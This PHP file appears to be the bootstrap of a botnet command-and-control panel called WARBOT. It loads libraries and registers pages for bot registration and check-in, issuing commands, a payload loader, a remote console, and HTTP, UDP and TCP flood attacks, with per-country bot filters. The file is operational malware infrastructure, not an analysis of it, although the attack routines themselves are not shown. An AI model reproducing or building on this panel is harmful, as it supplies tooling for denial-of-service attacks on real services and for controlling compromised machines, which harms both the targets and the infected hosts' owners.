<?php
	define("ABSOLUTEPATH", dirname(__FILE__));

	require_once(ABSOLUTEPATH . "/library/Require.lib.php"); //Requiring functions
	//Libraries
	require_folder_once(ABSOLUTEPATH . "/library", array(".lib.php"), false);
	//Classes
	require_folder_once(ABSOLUTEPATH . "/library/classes/standard", array(".class.php"), false);
	require_folder_once(ABSOLUTEPATH . "/library/classes/specialized", array(".class.php"), false);
	
	/* DO NOT EDIT BEYOND THIS LINE */
	define("WARBOT_INTERVAL", 3600);
	define("WARBOT_VERSION", "1.1.1011");
	//Pages
	Page::Add("Error", true);
	Page::Add("Header", true);
	Page::Add("Footer", true);
	Page::Add("Main");
	Page::Add("Login");
	Page::Add("Task");
	Page::Add("IssueCommand", false, false);
	Page::Add("BotRegister", false, false);
	Page::Add("BotPoke", false, false);
	Page::Add("UISaveState", false, false);
	Page::Add("UICreateReport", false, false);
	
	Page::Add("UIWindowConsole", false, false);
	Page::Add("UIWindowLoader", false, false);
	Page::Add("UIWindowHTTPFlood", false, false);
	Page::Add("UIWindowUDPFlood", false, false);
	Page::Add("UIWindowTCPFlood", false, false);
	Page::Add("UIWindowStats", false, false);
	Page::Add("UIWindowTasks", false, false);
	Page::Add("UIWindowFilters", false, false);
	Page::Add("UIWindowFiltersGetCountries", false, false);
?>